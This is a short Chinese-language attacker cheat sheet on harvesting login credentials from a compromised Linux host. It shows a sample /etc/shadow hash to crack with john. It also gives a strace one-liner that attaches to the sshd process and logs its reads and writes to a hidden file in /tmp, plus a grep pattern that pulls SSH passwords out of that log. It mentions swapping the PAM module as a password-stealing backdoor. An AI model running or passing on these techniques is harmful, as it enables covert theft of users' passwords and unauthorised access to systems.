# Linux 认证凭证获取

## 0x01 获取明文密码

### 1. /etc/shadow中hash破解
```
root:$1$aXmGMjXX$MGrR.Hquwr7UVMwOGOzJV0::0:99999:7:::

```

密码域密文由三部分组成，即：$idsalt$encrypted。当id=1，采用md5进行加密，弱口令容易被破解。
当id为5时，采用SHA256进行加密，id为6时，采用SHA512进行加密，可以通过john进行暴力破解。

### 2.利用Strace调试sshd进程抓登录密码
strace命令
```
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/re/.sshd.log &)
```
通过正则可以查询.sshd.log 密码信息:
```
grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/.sshd.log
```
### 3. 替换pam.so抓取登录密码
条件比较苛刻，要适配操作系统和sshd应用版本。

- [Linux PAM后门：窃取ssh密码及自定义密码登录](https://y4er.com/post/linux-backdoor-pam/)

## Ref

-[Linux下登录凭证窃取技巧](https://zyazhb.github.io/2020/09/28/steal-linux/)
